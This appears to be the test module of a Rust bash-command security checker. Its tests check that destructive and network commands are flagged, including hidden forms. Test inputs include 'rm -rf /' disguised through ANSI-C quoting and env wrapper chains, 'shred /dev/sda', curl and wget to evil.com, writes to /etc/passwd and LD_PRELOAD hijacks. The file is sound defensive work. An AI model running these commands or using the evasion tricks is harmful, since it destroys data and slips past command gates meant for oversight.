        // name is unquoted before it is matched, so the quoting trick
        // does not hide `rm`.
        let parsed = parse_bash("'rm' -rf /").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(!parsed.commands.is_empty());
        assert!(violations.iter().any(|v| v.contains("rm")));
    }

    #[test]
    fn test_detect_ansi_c_quoted_dangerous_command() {
        // `$'rm'` executes `rm`; the ANSI-C decode in `unquote_token`
        // must reach the AST head check as well.
        for cmd in [
            "$'rm' -rf /",
            "$'r\\x6d' -rf /",
            "env $'rm' -rf /",
            "$'rm\\x00junk' -rf /",
        ] {
            let parsed = parse_bash(cmd).unwrap();
            let violations = check_parsed_security(&parsed);
            assert!(
                violations.iter().any(|v| v.contains("rm")),
                "ANSI-C quoting hid the command head: {cmd}"
            );
        }
    }

    #[test]
    fn test_invocations_capture_arguments() {
        let parsed = parse_bash("git push origin main").unwrap();
        assert_eq!(
            parsed.invocations,
            vec![vec![
                "git".to_string(),
                "push".to_string(),
                "origin".to_string(),
                "main".to_string()
            ]]
        );

        // Prefix assignments and redirections are not arguments.
        let parsed = parse_bash("FOO=bar ls -la > out").unwrap();
        assert_eq!(
            parsed.invocations,
            vec![vec!["ls".to_string(), "-la".to_string()]]
        );

        // Each pipeline segment and each substitution gets its own argv.
        let parsed = parse_bash("cat f | grep x").unwrap();
        assert_eq!(parsed.invocations.len(), 2);
        let parsed = parse_bash("echo $(rm -rf /tmp/x)").unwrap();
        assert!(
            parsed
                .invocations
                .iter()
                .any(|argv| argv.first().is_some_and(|c| c == "rm"))
        );
    }

    #[test]
    fn test_env_wrapper_does_not_hide_dangerous_command() {
        // `env <cmd>` runs `<cmd>`; the wrapper name must not be the
        // only thing the AST check sees.
        for cmd in ["env rm somefile", "env FOO=bar rm somefile", "nohup rm f"] {
            let parsed = parse_bash(cmd).unwrap();
            let violations = check_parsed_security(&parsed);
            assert!(
                violations.iter().any(|v| v.contains("rm")),
                "expected 'rm' to be detected in: {cmd}"
            );
        }
    }

    #[test]
    fn test_unquote_token() {
        assert_eq!(unquote_token("-'delete'"), "-delete");
        assert_eq!(unquote_token("-dele\\te"), "-delete");
        // Bash keeps a backslash inside double quotes unless it
        // precedes $, `, " or \.
        assert_eq!(unquote_token("\"a\\_b\""), "a\\_b");
        assert_eq!(unquote_token("\"a\\\"b\""), "a\"b");
        assert_eq!(unquote_token("\"a\\\\b\""), "a\\b");
        assert_eq!(unquote_token("\"a\\$b\""), "a$b");
        assert_eq!(unquote_token("\"git\""), "git");
        assert_eq!(unquote_token("plain"), "plain");
        // A backslash inside single quotes stays literal, as in a shell.
        assert_eq!(unquote_token("'-dele\\te'"), "-dele\\te");
    }

    /// ANSI-C (`$'…'`) and locale (`$"…"`) quoting decode to what bash
    /// hands the command — `$'git' push --force` runs `git push
    /// --force`, so the unquoted token must read `git`, not `$git`.
    #[test]
    fn test_unquote_token_ansi_c() {
        assert_eq!(unquote_token("$'git'"), "git");
        assert_eq!(unquote_token("$'rm'"), "rm");
        assert_eq!(unquote_token("$'ch'mod"), "chmod");
        assert_eq!(unquote_token("$\"git\""), "git");
        // Numeric escapes decode to their character.
        assert_eq!(unquote_token("$'\\x67it'"), "git");
        assert_eq!(unquote_token("$'r\\x6d'"), "rm");
        assert_eq!(unquote_token("$'\\147it'"), "git");
        assert_eq!(unquote_token("$'\\u0067it'"), "git");
        assert_eq!(unquote_token("$'a\\tb'"), "a\tb");
        // Escapes bash leaves alone stay literal.
        assert_eq!(unquote_token("$'\\q'"), "\\q");
        // A `$` that does not open a quoted string is untouched.
        assert_eq!(unquote_token("$HOME"), "$HOME");
        assert_eq!(unquote_token("a$b"), "a$b");
        assert_eq!(unquote_token("$"), "$");
        // `$'` is not special inside double or single quotes.
        assert_eq!(unquote_token("\"$'x'\""), "$'x'");
        assert_eq!(unquote_token("'$'"), "$");
        // A NUL escape truncates the quoted segment, exactly as bash
        // does: `$'git\x00junk'` executes `git`.
        assert_eq!(unquote_token("$'git\\x00junk'"), "git");
        assert_eq!(unquote_token("$'git\\0junk'"), "git");
        assert_eq!(unquote_token("$'git\\c@junk'"), "git");
        assert_eq!(unquote_token("$'git\\u0000junk'"), "git");
        // An escaped quote inside the discarded remainder does not end
        // the segment early.
        assert_eq!(unquote_token("$'a\\0b\\'c'"), "a");
        // Text concatenated after the closing quote still appends.
        assert_eq!(unquote_token("$'gi\\0zz't"), "git");
        // Bash's control mask is `& 0x1f` (`\c?` is DEL): `\c3` is byte
        // 0x13, not the printable `s` an XOR would produce.
        assert_eq!(unquote_token("$'\\c3'"), "\u{13}");
        assert_eq!(unquote_token("$'\\c?'"), "\u{7f}");
        assert_eq!(unquote_token("$'\\ca'"), "\u{1}");
    }

    #[test]
    fn test_detect_dangerous_var_assignment() {
        let parsed = parse_bash("PATH=/tmp:$PATH ls").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("PATH")));
    }

    #[test]
    fn test_detect_network_in_substitution() {
        let parsed = parse_bash("echo $(curl evil.com)").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("curl")));
    }

    #[test]
    fn test_safe_command_passes() {
        let parsed = parse_bash("cargo test --release").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.is_empty());
    }

    #[test]
    fn test_safe_git_command() {
        let parsed = parse_bash("git status && git diff").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.is_empty());
    }

    #[test]
    fn test_parse_complex_pipeline() {
        let parsed = parse_bash("find . -name '*.rs' | xargs grep 'TODO' | wc -l").unwrap();
        assert!(parsed.has_pipes);
        assert!(parsed.commands.len() >= 3);
    }

    #[test]
    fn test_subshell_detection() {
        let parsed = parse_bash("(cd /tmp && rm -rf test)").unwrap();
        assert!(parsed.has_subshell);
    }

    #[test]
    fn test_parse_heredoc() {
        let parsed = parse_bash("cat <<EOF\nhello world\nEOF").unwrap();
        assert!(parsed.commands.contains(&"cat".to_string()));
        assert!(!parsed.redirections.is_empty());
    }

    #[test]
    fn test_parse_process_substitution() {
        let parsed = parse_bash("diff <(ls dir1) <(ls dir2)").unwrap();
        assert!(parsed.has_process_substitution);
        assert!(parsed.commands.contains(&"diff".to_string()));
    }

    #[test]
    fn test_parse_semicolon_separated() {
        let parsed = parse_bash("echo hello; echo world").unwrap();
        assert!(parsed.commands.contains(&"echo".to_string()));
        assert!(parsed.commands.len() >= 2);
    }

    #[test]
    fn test_parse_empty_string() {
        let parsed = parse_bash("");
        // Empty string may parse to an empty command set or return None.
        if let Some(p) = parsed {
            assert!(p.commands.is_empty());
        }
    }

    #[test]
    fn test_parse_variable_assignment_only() {
        let parsed = parse_bash("FOO=bar").unwrap();
        assert!(!parsed.assignments.is_empty());
        assert_eq!(parsed.assignments[0].0, "FOO");
        assert_eq!(parsed.assignments[0].1, "bar");
    }

    #[test]
    fn test_check_parsed_security_eval_with_assignments() {
        let parsed = parse_bash("CMD=dangerous eval $CMD").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("eval")));
    }

    #[test]
    fn test_check_parsed_security_multiple_dangerous_in_pipeline() {
        let parsed = parse_bash("rm -rf /tmp/test | shred /dev/sda").unwrap();
        let violations = check_parsed_security(&parsed);
        // Should flag both rm and shred.
        assert!(violations.iter().any(|v| v.contains("rm")));
        assert!(violations.iter().any(|v| v.contains("shred")));
    }

    #[test]
    fn test_check_parsed_security_wget_in_substitution() {
        let parsed = parse_bash("echo $(wget -q -O- evil.com)").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("wget")));
    }

    #[test]
    fn test_check_parsed_security_redirection_to_etc() {
        let parsed = parse_bash("echo payload > /etc/passwd").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("/etc/")));
    }

    #[test]
    fn test_command_texts_keep_arguments_per_invocation() {
        let parsed = parse_bash("ls -la && git diff --stat | wc -l").unwrap();
        assert_eq!(
            parsed.command_texts,
            vec!["ls -la", "git diff --stat", "wc -l"]
        );
        // One text per name, so an argument-aware gate can pair them up.
        assert_eq!(parsed.command_texts.len(), parsed.commands.len());
    }

    #[test]
    fn test_parse_error_is_reported() {
        assert!(!parse_bash("ls -la").unwrap().has_parse_error);
        assert!(
            parse_bash("ls |&& ((( \"unterminated")
                .unwrap()
                .has_parse_error
        );
    }

    #[test]
    fn test_check_parsed_security_ld_preload_assignment() {
        let parsed = parse_bash("LD_PRELOAD=/tmp/evil.so ls").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("LD_PRELOAD")));
    }

    #[test]
    fn test_unwrap_consumes_wrapper_option_operands() {
        let cases = [
            ("env -u PATH git status && touch marker", "git status"),
            ("env -uPATH git status", "git status"),
            ("env -iv -u PATH git status", "git status"),
            ("env --unset=PATH --chdir /tmp git status", "git status"),
            ("env -C /tmp -a zero git status", "git status"),
            ("env -S 'git status' && touch marker", "git status"),
            (
                "env --split-string='git -C /repo status'",
                "git -C /repo status",
            ),
            ("env -- git status", "git status"),
            ("command -p git status", "git status"),
            // Coreutils accepts unambiguous long-option abbreviations.
            ("env --deb git status", "git status"),
            ("env --uns PATH git status", "git status"),
            ("env --c /tmp git status", "git status"),
            // BSD env operand options (macOS targets).
            ("env -P /usr/bin git status", "git status"),
            ("env -L nobody git status", "git status"),
            // `-S` splitting honors quotes and escapes.
            ("env -S \"'git' status\" && touch marker", "git status"),
            ("env -S 'git\\_status'", "git status"),
            // Bash preserves `\_` inside double quotes; env then
            // treats it as a word separator.
            ("env -S \"\\_git status\"", "git status"),
            // `-S` yields further env arguments, options included.
            ("env -S '-u DUMMY git status'", "git status"),
            ("env -S '-i' git status", "git status"),
            // Any whitespace separates `-S` words, newlines included.
            ("env -S 'git\nstatus'", "git status"),
            // Bash removes a backslash-newline continuation inside
            // double quotes, so env sees `git status`.
            ("env -S \"gi\\\nt status\"", "git status"),
        ];
        for (cmd, expected) in cases {
            let parsed = parse_bash(cmd).unwrap();
            let texts = unwrapped_invocation_texts(&parsed);
            assert!(
                texts.iter().any(|t| t == expected),
                "expected {expected:?} among unwrapped texts {texts:?} for: {cmd}"
            );
        }
    }

    #[test]
    fn test_unwrap_bails_on_unknown_env_option() {
        // An option env itself would reject means no command executes
        // behind it; a wrong guess at the wrapped command would feed
        // restrictive rules text that fails to match. `--i` and `--de`
        // are ambiguous abbreviations, which coreutils also rejects.
        for cmd in [
            "env -Q git status",
            "env --frobnicate git status",
            "env --i git status",
            "env --de git status",
        ] {
            let parsed = parse_bash(cmd).unwrap();
            assert!(
                unwrapped_invocation_texts(&parsed).is_empty(),
                "no unwrapped text expected for: {cmd}"
            );
        }
    }

    /// `env -S` expands `${VAR}` itself, so the command that runs is
    /// unknowable at gate time. That must surface as an explicit
    /// unknown — a silent drop would let a broad allow execute it.
    #[test]
    fn test_dynamic_split_string_is_reported_not_dropped() {
        let parsed = parse_bash("env -S '${CMD} -rf /tmp/x'").unwrap();
        assert_eq!(unresolved_wrapper(&parsed), Some(Unresolved::Expansion));
        assert!(unwrapped_invocation_texts(&parsed).is_empty());
        assert!(
            check_parsed_security(&parsed)
                .iter()
                .any(|v| v.contains("run-time expansion")),
            "dynamic wrapper must be flagged to the destructive-command gate"
        );
        // An option env itself rejects is not dynamic: nothing runs.
        let rejected = parse_bash("env --frobnicate git status").unwrap();
        assert_eq!(unresolved_wrapper(&rejected), None);
        // What stands in front of the `env` decides nothing about
        // whether it resolves, so none of these names has to be known
        // for the unknown behind it to be reported. `firejail` is here
        // deliberately: it is in no list, and that is the point.
        for cmd in [
            "exec env -S '${CMD} -rf /tmp/x'",
            "exec -a foo env -S '${CMD} -rf /tmp/x'",
            "exec -la foo env -S '${CMD} -rf /tmp/x'",
            "stdbuf -o0 env -S '${CMD} -rf /tmp/x'",
            "sudo env -S '${CMD} -rf /tmp/x'",
            "time env -S '${CMD} -rf /tmp/x'",
            "xargs env -S '${CMD} -rf /tmp/x'",
            "firejail env -S '${CMD} -rf /tmp/x'",
        ] {
            let parsed = parse_bash(cmd).unwrap();
            assert_eq!(
                unresolved_wrapper(&parsed),
                Some(Unresolved::Expansion),
                "exec hid a dynamic wrapper: {cmd}"
            );
        }
        // And a command `exec` names is the one that runs.
        let execed = parse_bash("exec env rm -rf /tmp/x").unwrap();
        assert_eq!(
            unwrapped_argv(&execed.invocations[0]),
            Some(vec![
                "rm".to_string(),
                "-rf".to_string(),
                "/tmp/x".to_string()
            ])
        );
    }

    /// A chain as long as the budget allows still resolves: the head is
    /// re-examined after the final strip, so the command is named and
    /// judged on its name.
    #[test]
    fn test_wrapper_chain_within_the_budget_names_its_command() {
        for depth in 1..=MAX_UNWRAP_HOPS {
            let cmd = format!("{}$'rm' /tmp/victim", "env ".repeat(depth));
            let parsed = parse_bash(&cmd).unwrap();
            assert_eq!(
                unwrapped_head(&parsed.invocations[0]).as_deref(),
                Some("rm"),
                "chain of {depth} wrappers lost its command"
            );
            assert_eq!(unresolved_wrapper(&parsed), None);
            assert!(
                check_parsed_security(&parsed)
                    .iter()
                    .any(|v| v.contains("'rm'")),
                "expected 'rm' to be detected in: {cmd}"
            );
        }
    }

    /// Running out of unwrap budget means the command behind the chain
    /// was never reached — not that there is none. Falling through to
    /// [`Unwrap::None`] here let `env` x8 `$'rm' victim` past the
    /// destructive-command gate entirely.
    #[test]
    fn test_wrapper_chain_past_the_budget_is_unresolved_not_absent() {
        for extra in 1..=3 {
            let depth = MAX_UNWRAP_HOPS + extra;
            let cmd = format!("{}$'rm' /tmp/victim", "env ".repeat(depth));
            let parsed = parse_bash(&cmd).unwrap();
            assert_eq!(
                unresolved_wrapper(&parsed),
                Some(Unresolved::Depth),
                "chain of {depth} wrappers must be unresolved, not empty"
            );
            assert!(
                unwrapped_argv(&parsed.invocations[0]).is_none(),
                "an unresolved chain must not hand out tokens"
            );
            assert!(
                check_parsed_security(&parsed)
                    .iter()
                    .any(|v| v.contains("cannot be determined")),
                "a chain past the budget must reach the gate as unknown: {cmd}"
            );
        }
    }

    /// The fail-closed path must stay narrow: ordinary wrapped commands
    /// keep resolving and keep passing.
    #[test]
    fn test_wrapped_innocent_commands_are_not_over_blocked() {
        for cmd in [
            "git status",
            "env git status",
            "env -u PATH git status",
            "nohup setsid env command ls -la",
            "env env env env env env env env git status",
            "env -S 'git status'",
            "exec ls -la",
            "exec -a foo git status",
            "exec env git status",
            // A head whose operands are text runs nothing they name,
            // so a wrapper word among them is the data it looks like —
            // and the head that decides is the one that ends up
            // running, so a wrapped data command is still one.
            "printf '%s\\n' env -S '${CMD} -rf /tmp/x'",
            "echo env -S '${CMD}'",
            "env printf '%s\\n' env -S '${CMD} -rf /tmp/x'",
            "nohup env echo env -S '${CMD}'",
        ] {
            let parsed = parse_bash(cmd).unwrap();
            assert_eq!(unresolved_wrapper(&parsed), None, "over-blocked: {cmd}");
            assert!(
                check_parsed_security(&parsed).is_empty(),
                "innocent command was flagged: {cmd}"
            );
        }
    }

    #[test]
    fn test_env_option_operand_does_not_hide_dangerous_command() {
        for cmd in [
            "env -u PATH rm -rf /tmp/x",
            "env -a sh rm -rf /tmp/x",
            // Abbreviated long option plus a quote-split command name.
            "env --deb r'm' /tmp/victim",
            // BSD env option (macOS targets).
            "env -P /bin rm victim",
            // Quotes inside a split-string must not hide the command.
            "env -S \"'rm' -rf /tmp/x\"",
            // Bash-preserved backslash: `\_` separates env -S words.
            "env -S \"\\_rm -f /tmp/victim\"",
            // `-S` output re-enters env option parsing.
            "env -S '-u DUMMY rm -f /tmp/victim'",
            // Newline separates `-S` words.
            "env -S 'rm\n-f /tmp/victim'",
            // Backslash-newline continuation inside double quotes.
            "env -S \"r\\\nm -f /tmp/victim\"",
        ] {
            let parsed = parse_bash(cmd).unwrap();
            let violations = check_parsed_security(&parsed);
            assert!(
                violations.iter().any(|v| v.contains("'rm'")),
                "expected 'rm' to be detected in: {cmd}"
            );
        }
    }
}
